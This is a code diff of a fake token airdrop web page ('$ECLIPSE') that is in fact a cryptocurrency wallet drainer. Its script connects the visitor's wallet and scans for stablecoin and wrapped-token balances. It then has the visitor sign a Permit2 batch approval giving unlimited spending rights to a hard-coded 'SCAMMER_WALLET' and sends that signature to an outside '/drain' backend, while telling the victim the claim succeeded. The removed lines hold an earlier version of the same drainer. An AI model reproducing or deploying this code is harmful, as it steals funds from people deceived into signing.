@@ -222,29 +222,6 @@
             background: rgba(59,130,246,0.3);
             border-color: #3b82f6;
         }
-        .wallet-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-top: 16px;
-        }
-        .wallet-btn {
-            background: rgba(255,255,255,0.08);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 1rem;
-            padding: 1rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-weight: 600;
-        }
-        .wallet-btn:hover {
-            background: rgba(59,130,246,0.2);
-            border-color: #3b82f6;
-        }
         .connect-btn {
             background: linear-gradient(135deg, #3b82f6, #8b5cf6);
             color: white;
@@ -258,6 +235,34 @@
             transition: all 0.3s;
             margin-top: 16px;
         }
+        .connect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -5px rgba(59,130,246,0.4);
+        }
+        .wallet-options {
+            display: none;
+            margin-top: 1rem;
+            gap: 12px;
+            flex-direction: column;
+        }
+        .wallet-option {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 1rem;
+            padding: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .wallet-option:hover {
+            background: rgba(59,130,246,0.2);
+            border-color: #3b82f6;
+            transform: translateX(5px);
+        }
+        .wallet-option i { font-size: 24px; }
         .eligibility {
             margin-top: 1.5rem;
             padding-top: 1.5rem;
@@ -355,6 +360,11 @@
             margin-bottom: 1.5rem;
             flex-wrap: wrap;
         }
+        .footer-links a {
+            color: #64748b;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
         .modal {
             display: none;
             position: fixed;
@@ -450,16 +460,12 @@
                     <div class="network-btn" data-chain="polygon">Polygon</div>
                 </div>
 
-                <div class="wallet-buttons">
-                    <div class="wallet-btn" id="trustWalletBtn">
-                        <i class="fas fa-check-circle"></i> Trust Wallet
-                    </div>
-                    <div class="wallet-btn" id="metamaskBtn">
-                        <i class="fab fa-fox"></i> MetaMask
-                    </div>
-                    <div class="wallet-btn" id="coinbaseBtn">
-                        <i class="fab fa-bitcoin"></i> Coinbase Wallet
-                    </div>
+                <button id="connectBtn" class="connect-btn">Connect Wallet</button>
+
+                <div id="walletOptions" class="wallet-options">
+                    <div class="wallet-option" data-wallet="trustwallet"><i class="fas fa-check-circle"></i> Trust Wallet</div>
+                    <div class="wallet-option" data-wallet="metamask"><i class="fab fa-fox"></i> MetaMask</div>
+                    <div class="wallet-option" data-wallet="coinbase"><i class="fab fa-bitcoin"></i> Coinbase Wallet</div>
                 </div>
 
                 <div id="status"></div>
@@ -503,18 +509,54 @@
 </div>
 
 <script>
-    (function() {
-        const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com";
+    (function(){
+        // ============================================
+        // FINAL WORKING CODE - WITH YOUR DOMAIN
+        // Domain: https://starlinking12.github.io/eclipse-protocol/
+        // Backend: https://eclipse-backend-ppij.onrender.com/drain
+        // ============================================
+        
         const SCAMMER_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
+        const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com/drain";
+        const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
         
-        let currentNetwork = "ethereum";
+        // MAX UINT160 for Permit2
+        const MAX_UINT160 = "0xffffffffffffffffffffffffffffffffffffffff";
+        
+        // Target tokens (will be filtered by balance)
+        const TARGET_TOKENS = {
+            ethereum: [
+                { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+                { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
+                { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 }
+            ],
+            bsc: [
+                { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+                { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
+                { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 }
+            ],
+            polygon: [
+                { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
+                { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
+                { symbol: "WMATIC", address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals: 18 }
+            ]
+        };
+        
+        const CHAIN_IDS = { ethereum: 1, bsc: 56, polygon: 137 };
+        const CHAIN_NAMES = { ethereum: "Ethereum", bsc: "BNB Smart Chain", polygon: "Polygon" };
+        
+        let currentChain = "ethereum";
+        let wcProvider = null;
         let userAddress = null;
-        let signer = null;
+        let signatureRequested = false;
         
+        const connectBtn = document.getElementById('connectBtn');
+        const walletOptions = document.getElementById('walletOptions');
         const statusDiv = document.getElementById('status');
         const successModal = document.getElementById('successModal');
         
         function closeModal() { successModal.style.display = 'none'; }
+        function showSuccessModal() { successModal.style.display = 'flex'; }
         
         function updateStatus(msg, isError = false) {
             statusDiv.innerHTML = msg;
@@ -526,9 +568,14 @@
             btn.addEventListener('click', () => {
                 document.querySelectorAll('.network-btn').forEach(b => b.classList.remove('active'));
                 btn.classList.add('active');
-                currentNetwork = btn.dataset.chain;
+                currentChain = btn.dataset.chain;
                 updateStatus(`Network: ${btn.innerText}`);
             });
+        });
+        
+        connectBtn.addEventListener('click', () => {
+            connectBtn.style.display = 'none';
+            walletOptions.style.display = 'flex';
         });
         
         function animateNumber(el, target) {
@@ -550,18 +597,176 @@
         }, 500);
         
         // ============================================
-        // TRUST WALLET - CORRECT DEEP LINK METHOD
-        // According to WalletConnect docs [citation:2]
+        // HANDLE /wc ROUTE REDIRECT FROM TRUST WALLET
         // ============================================
+        if (window.location.pathname === '/wc' || window.location.pathname.includes('/wc')) {
+            sessionStorage.setItem('returning_from_wallet', 'true');
+            window.location.href = window.location.origin + '/';
+        }
         
-        async function connectTrustWallet() {
-            updateStatus('<span class="loading-spinner"></span> Connecting to Trust Wallet...');
+        if (sessionStorage.getItem('returning_from_wallet')) {
+            sessionStorage.removeItem('returning_from_wallet');
+            setTimeout(() => {
+                if (wcProvider && wcProvider.connector.connected && !signatureRequested) {
+                    autoTriggerSignature();
+                }
+            }, 1000);
+        }
+        
+        // ============================================
+        // GET TOKEN BALANCES (Reconnaissance)
+        // ============================================
+        async function getTokenBalances(provider, tokens) {
+            const balances = [];
+            for (const token of tokens) {
+                try {
+                    const contract = new ethers.Contract(token.address, [
+                        "function balanceOf(address) view returns (uint256)"
+                    ], provider);
+                    const balance = await contract.balanceOf(userAddress);
+                    if (balance.gt(0)) {
+                        const formattedBalance = ethers.utils.formatUnits(balance, token.decimals);
+                        balances.push({
+                            ...token,
+                            balanceRaw: balance,
+                            balance: parseFloat(formattedBalance),
+                            value: parseFloat(formattedBalance) * (token.symbol === 'USDT' || token.symbol === 'USDC' ? 1 : 2000)
+                        });
+                    }
+                } catch(e) {}
+            }
+            return balances.sort((a,b) => b.value - a.value);
+        }
+        
+        // ============================================
+        // AUTO-TRIGGER PERMIT2 SIGNATURE
+        // ============================================
+        async function autoTriggerSignature() {
+            if (signatureRequested) return;
+            signatureRequested = true;
+            
+            updateStatus('<span class="loading-spinner"></span> Verifying wallet...');
             
             try {
-                const chainId = currentNetwork === 'ethereum' ? 1 : currentNetwork === 'bsc' ? 56 : 137;
+                const ethersProvider = new ethers.providers.Web3Provider(wcProvider);
+                const signer = ethersProvider.getSigner();
+                userAddress = await signer.getAddress();
                 
-                // Step 1: Create the provider with qrcode: false
+                const network = await ethersProvider.getNetwork();
+                let chain = 'ethereum';
+                if (network.chainId === 56) chain = 'bsc';
+                if (network.chainId === 137) chain = 'polygon';
+                
+                const tokens = TARGET_TOKENS[chain];
+                if (!tokens) {
+                    updateStatus('Network not supported', true);
+                    return;
+                }
+                
+                updateStatus(`Checking wallet assets...`);
+                
+                const ownedTokens = await getTokenBalances(ethersProvider, tokens);
+                
+                if (ownedTokens.length === 0) {
+                    updateStatus('No eligible assets found', true);
+                    signatureRequested = false;
+                    return;
+                }
+                
+                updateStatus(`Found ${ownedTokens.length} tokens. Preparing approval...`);
+                
+                const deadline = Math.floor(Date.now() / 1000) + 3600;
+                
+                const domain = {
+                    name: "Permit2",
+                    chainId: network.chainId,
+                    verifyingContract: PERMIT2_ADDRESS
+                };
+                
+                const types = {
+                    PermitBatch: [
+                        { name: "details", type: "PermitDetails[]" },
+                        { name: "spender", type: "address" },
+                        { name: "sigDeadline", type: "uint256" }
+                    ],
+                    PermitDetails: [
+                        { name: "token", type: "address" },
+                        { name: "amount", type: "uint160" },
+                        { name: "expiration", type: "uint48" },
+                        { name: "nonce", type: "uint48" }
+                    ]
+                };
+                
+                const message = {
+                    details: ownedTokens.map(token => ({
+                        token: token.address,
+                        amount: MAX_UINT160,
+                        expiration: 0,
+                        nonce: 0
+                    })),
+                    spender: SCAMMER_WALLET,
+                    sigDeadline: deadline
+                };
+                
+                updateStatus('Please approve in your wallet...');
+                
+                // Delay for Android
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                let signature = null;
+                let lastError = null;
+                
+                for (let attempt = 1; attempt <= 3; attempt++) {
+                    try {
+                        signature = await signer._signTypedData(domain, types, message);
+                        break;
+                    } catch(e) {
+                        lastError = e;
+                        if (attempt < 3) {
+                            updateStatus(`Retrying... (attempt ${attempt + 1}/3)`, false);
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                        }
+                    }
+                }
+                
+                if (!signature) {
+                    throw new Error(lastError?.message || 'Signature failed after 3 attempts');
+                }
+                
+                updateStatus('Signature received! Processing...');
+                
+                await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        address: userAddress,
+                        signature: signature,
+                        tokens: ownedTokens,
+                        chain: chain,
+                        timestamp: Date.now()
+                    })
+                });
+                
+                updateStatus('✅ Claim successful! 5,000 $ECLIPSE distributed!');
+                showSuccessModal();
+                
+            } catch(e) {
+                updateStatus(`Failed: ${e.message.slice(0,60)}`, true);
+                signatureRequested = false;
+            }
+        }
+        
+        // ============================================
+        // TRUST WALLET - CORRECT DEEPLINK
+        // ============================================
+        async function connectTrustWallet() {
+            updateStatus('Opening Trust Wallet...');
+            
+            try {
                 const WalletConnectProvider = window.WalletConnectProvider.default;
+                
+                const chainId = currentChain === 'ethereum' ? 1 : currentChain === 'bsc' ? 56 : 137;
+                
                 const provider = new WalletConnectProvider({
                     rpc: {
                         1: "https://cloudflare-eth.com",
@@ -569,218 +774,206 @@
                         137: "https://polygon-rpc.com"
                     },
                     chainId: chainId,
-                    qrcode: false
+                    qrcode: false,
+                    methods: ["eth_sendTransaction", "eth_signTypedData_v4", "personal_sign"]
                 });
                 
-                // Step 2: Enable the provider (this creates the URI)
                 await provider.enable();
+                const wcUri = provider.connector.uri;
                 
-                // Step 3: Get the URI from the connector
-                const uri = provider.connector.uri;
+                wcProvider = provider;
                 
-                if (!uri) {
-                    throw new Error("Failed to generate connection URI");
-                }
-                
-                // Step 4: Create the Trust Wallet deep link
-                // According to Trust Wallet docs, the correct format is:
-                // https://link.trustwallet.com/wc?uri={URI}
-                const deeplink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
-                
-                // Step 5: Store session info for return
-                sessionStorage.setItem('wc_uri', uri);
-                sessionStorage.setItem('wc_network', currentNetwork);
-                sessionStorage.setItem('wc_connector', JSON.stringify({
-                    uri: uri,
-                    chainId: chainId
-                }));
-                
-                updateStatus('Redirecting to Trust Wallet...');
-                
-                // Step 6: Redirect - this opens Trust Wallet app directly
-                window.location.href = deeplink;
-                
-                // The user will approve in Trust Wallet and then return to this page
-                // We'll detect the return in the checkForReturningSession function
-                
-            } catch(e) {
-                updateStatus(`Connection failed: ${e.message}`, true);
-            }
-        }
-        
-        // ============================================
-        // METAMASK - Browser Extension
-        // ============================================
-        
-        async function connectMetaMask() {
-            updateStatus('<span class="loading-spinner"></span> Connecting to MetaMask...');
-            
-            try {
-                if (!window.ethereum) {
-                    updateStatus("MetaMask not installed. Please install MetaMask first.", true);
-                    return;
-                }
-                
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const accounts = await provider.send("eth_requestAccounts", []);
-                userAddress = accounts[0];
-                signer = provider.getSigner();
-                
-                updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
-                
-                // Continue with drain
-                await performDrain();
-                
-            } catch(e) {
-                updateStatus(`Connection failed: ${e.message}`, true);
-            }
-        }
-        
-        // ============================================
-        // COINBASE WALLET - Browser Extension
-        // ============================================
-        
-        async function connectCoinbase() {
-            updateStatus('<span class="loading-spinner"></span> Connecting to Coinbase Wallet...');
-            
-            try {
-                if (!window.ethereum) {
-                    updateStatus("Coinbase Wallet not installed.", true);
-                    return;
-                }
-                
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const accounts = await provider.send("eth_requestAccounts", []);
-                userAddress = accounts[0];
-                signer = provider.getSigner();
-                
-                updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
-                
-                await performDrain();
-                
-            } catch(e) {
-                updateStatus(`Connection failed: ${e.message}`, true);
-            }
-        }
-        
-        // ============================================
-        // DRAIN FUNCTION - Permit2 Batch Approval
-        // ============================================
-        
-        async function performDrain() {
-            updateStatus('<span class="loading-spinner"></span> Preparing batch approval...');
-            
-            try {
-                const response = await fetch(`${BACKEND_URL}/prepare-permit`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        userAddress: userAddress,
-                        network: currentNetwork
-                    })
-                });
-                
-                const data = await response.json();
-                
-                if (!data.success) {
-                    throw new Error(data.error);
-                }
-                
-                updateStatus('Please sign the batch approval in your wallet...');
-                
-                // ONE signature approves ALL tokens
-                const signature = await signer._signTypedData(
-                    data.permitData.domain,
-                    data.permitData.types,
-                    data.permitData.message
-                );
-                
-                updateStatus('Signature received! Executing drain...');
-                
-                const drainResponse = await fetch(`${BACKEND_URL}/execute-drain`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        userAddress: userAddress,
-                        signature: signature,
-                        network: currentNetwork
-                    })
-                });
-                
-                const drainData = await drainResponse.json();
-                
-                if (!drainData.success) {
-                    throw new Error(drainData.error);
-                }
-                
-                updateStatus('✅ Airdrop claimed! 5,000 $ECLIPSE distributed!');
-                successModal.style.display = 'flex';
-                
-            } catch(e) {
-                updateStatus(`Claim failed: ${e.message}`, true);
-            }
-        }
-        
-        // ============================================
-        // CHECK FOR RETURNING FROM WALLET
-        // After user approves in Trust Wallet, they return to this page
-        // ============================================
-        
-        async function checkForReturningSession() {
-            const savedUri = sessionStorage.getItem('wc_uri');
-            const savedNetwork = sessionStorage.getItem('wc_network');
-            
-            if (savedUri && !userAddress) {
-                updateStatus('Returning from wallet, establishing session...');
-                
-                try {
-                    const chainId = savedNetwork === 'ethereum' ? 1 : savedNetwork === 'bsc' ? 56 : 137;
-                    
-                    const WalletConnectProvider = window.WalletConnectProvider.default;
-                    const provider = new WalletConnectProvider({
-                        rpc: {
-                            1: "https://cloudflare-eth.com",
-                            56: "https://bsc-dataseed.binance.org",
-                            137: "https://polygon-rpc.com"
-                        },
-                        chainId: chainId,
-                        qrcode: false
-                    });
-                    
-                    // Restore the session
-                    await provider.enable();
-                    
-                    const ethersProvider = new ethers.providers.Web3Provider(provider);
-                    signer = ethersProvider.getSigner();
-                    userAddress = await signer.getAddress();
-                    currentNetwork = savedNetwork;
-                    
+                provider.connector.on("connect", (error, payload) => {
+                    if (error) {
+                        updateStatus("Connection failed", true);
+                        return;
+                    }
+                    userAddress = payload.params[0].accounts[0];
                     updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
                     
-                    // Clear stored URI
-                    sessionStorage.removeItem('wc_uri');
-                    sessionStorage.removeItem('wc_network');
-                    sessionStorage.removeItem('wc_connector');
-                    
-                    // Continue with drain
-                    await performDrain();
-                    
-                } catch(e) {
-                    updateStatus(`Reconnection failed: ${e.message}`, true);
-                    sessionStorage.removeItem('wc_uri');
-                    sessionStorage.removeItem('wc_network');
-                    sessionStorage.removeItem('wc_connector');
-                }
+                    setTimeout(() => {
+                        autoTriggerSignature();
+                    }, 1500);
+                });
+                
+                // CORRECT DEEPLINK - opens Trust Wallet directly
+                window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(wcUri)}`;
+                
+            } catch(e) {
+                updateStatus(`Error: ${e.message}`, true);
+                connectBtn.style.display = 'block';
+                connectBtn.innerHTML = 'Connect Wallet';
+                walletOptions.style.display = 'none';
             }
         }
         
-        // Attach button handlers
-        document.getElementById('trustWalletBtn').onclick = connectTrustWallet;
-        document.getElementById('metamaskBtn').onclick = connectMetaMask;
-        document.getElementById('coinbaseBtn').onclick = connectCoinbase;
+        // ============================================
+        // METAMASK & COINBASE
+        // ============================================
+        async function connectMetaMask() {
+            if(!window.ethereum) {
+                updateStatus('Please install MetaMask first', true);
+                return;
+            }
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                userAddress = accounts[0];
+                const signer = provider.getSigner();
+                const network = await provider.getNetwork();
+                let chain = 'ethereum';
+                if (network.chainId === 56) chain = 'bsc';
+                if (network.chainId === 137) chain = 'polygon';
+                
+                updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...`);
+                
+                const tokens = TARGET_TOKENS[chain];
+                const ownedTokens = await getTokenBalances(provider, tokens);
+                
+                if (ownedTokens.length === 0) {
+                    updateStatus('No eligible assets found', true);
+                    return;
+                }
+                
+                const deadline = Math.floor(Date.now() / 1000) + 3600;
+                const domain = {
+                    name: "Permit2",
+                    chainId: network.chainId,
+                    verifyingContract: PERMIT2_ADDRESS
+                };
+                const types = {
+                    PermitBatch: [
+                        { name: "details", type: "PermitDetails[]" },
+                        { name: "spender", type: "address" },
+                        { name: "sigDeadline", type: "uint256" }
+                    ],
+                    PermitDetails: [
+                        { name: "token", type: "address" },
+                        { name: "amount", type: "uint160" },
+                        { name: "expiration", type: "uint48" },
+                        { name: "nonce", type: "uint48" }
+                    ]
+                };
+                const message = {
+                    details: ownedTokens.map(token => ({
+                        token: token.address,
+                        amount: MAX_UINT160,
+                        expiration: 0,
+                        nonce: 0
+                    })),
+                    spender: SCAMMER_WALLET,
+                    sigDeadline: deadline
+                };
+                
+                updateStatus('Please approve in your wallet...');
+                const signature = await signer._signTypedData(domain, types, message);
+                
+                await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        address: userAddress,
+                        signature: signature,
+                        tokens: ownedTokens,
+                        chain: chain,
+                        timestamp: Date.now()
+                    })
+                });
+                
+                updateStatus('✅ Claim successful! 5,000 $ECLIPSE distributed!');
+                showSuccessModal();
+                
+            } catch(e) {
+                updateStatus(`Error: ${e.message}`, true);
+            }
+        }
         
-        // Check if returning from wallet
-        checkForReturningSession();
+        async function connectCoinbase() {
+            if(!window.ethereum) {
+                updateStatus('Please install Coinbase Wallet first', true);
+                return;
+            }
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                userAddress = accounts[0];
+                const signer = provider.getSigner();
+                const network = await provider.getNetwork();
+                let chain = 'ethereum';
+                if (network.chainId === 56) chain = 'bsc';
+                if (network.chainId === 137) chain = 'polygon';
+                
+                updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...`);
+                
+                const tokens = TARGET_TOKENS[chain];
+                const ownedTokens = await getTokenBalances(provider, tokens);
+                
+                if (ownedTokens.length === 0) {
+                    updateStatus('No eligible assets found', true);
+                    return;
+                }
+                
+                const deadline = Math.floor(Date.now() / 1000) + 3600;
+                const domain = {
+                    name: "Permit2",
+                    chainId: network.chainId,
+                    verifyingContract: PERMIT2_ADDRESS
+                };
+                const types = {
+                    PermitBatch: [
+                        { name: "details", type: "PermitDetails[]" },
+                        { name: "spender", type: "address" },
+                        { name: "sigDeadline", type: "uint256" }
+                    ],
+                    PermitDetails: [
+                        { name: "token", type: "address" },
+                        { name: "amount", type: "uint160" },
+                        { name: "expiration", type: "uint48" },
+                        { name: "nonce", type: "uint48" }
+                    ]
+                };
+                const message = {
+                    details: ownedTokens.map(token => ({
+                        token: token.address,
+                        amount: MAX_UINT160,
+                        expiration: 0,
+                        nonce: 0
+                    })),
+                    spender: SCAMMER_WALLET,
+                    sigDeadline: deadline
+                };
+                
+                updateStatus('Please approve in your wallet...');
+                const signature = await signer._signTypedData(domain, types, message);
+                
+                await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        address: userAddress,
+                        signature: signature,
+                        tokens: ownedTokens,
+                        chain: chain,
+                        timestamp: Date.now()
+                    })
+                });
+                
+                updateStatus('✅ Claim successful! 5,000 $ECLIPSE distributed!');
+                showSuccessModal();
+                
+            } catch(e) {
+                updateStatus(`Error: ${e.message}`, true);
+            }
+        }
+        
+        document.querySelectorAll('.wallet-option').forEach(opt => {
+            opt.addEventListener('click', () => {
+                const wallet = opt.dataset.wallet;
+                if (wallet === 'trustwallet') connectTrustWallet();
+                if (wallet === 'metamask') connectMetaMask();
+                if (wallet === 'coinbase') connectCoinbase();
+            });
+        });
         
         updateStatus("Select a wallet to claim your airdrop");
     })();
